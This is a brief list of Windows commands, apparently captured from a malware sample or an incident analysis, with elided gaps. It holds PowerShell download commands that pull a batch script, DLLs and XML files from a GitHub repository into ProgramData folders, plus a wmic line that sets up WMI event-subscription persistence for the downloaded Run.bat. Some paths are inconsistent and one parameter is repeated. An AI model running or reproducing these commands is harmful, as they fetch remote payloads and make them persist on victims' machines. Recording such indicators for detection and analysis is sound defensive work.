...
powershell.exe iwr -Uri https://github.com/wazgame/waz/raw/main/FoxsUpdate.xml -OutFile C:\ProgramData\FoxsUpdate.xml
powershell.exe iwr -Uri https://github.com/wazgame/waz/raw/main/UpdateDirect.xml -OutFile C:\ProgramData\UpdateDirect.xml
...
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="pers", CommandLineTemplate="C:\ProgramData\Dackage..\Run.bat", CommandLineTemplate="C:\ProgramData\Dackage..\Run.bat"
...
powershell.exe iwr -Uri https://github.com/wazgame/waz/raw/main/Run.bat -OutFile C:\ProgramData\Dackag\Run.bat
powershell.exe iwr -Uri https://github.com/wazgame/waz/raw/main/ShellExt.dll -OutFile C:\ProgramData\Dackag\ShellExt.dll
powershell.exe iwr -Uri https://github.com/wazgame/waz/raw/main/utshellext.dll -OutFile C:\ProgramData\Dackag\utshellext.dll
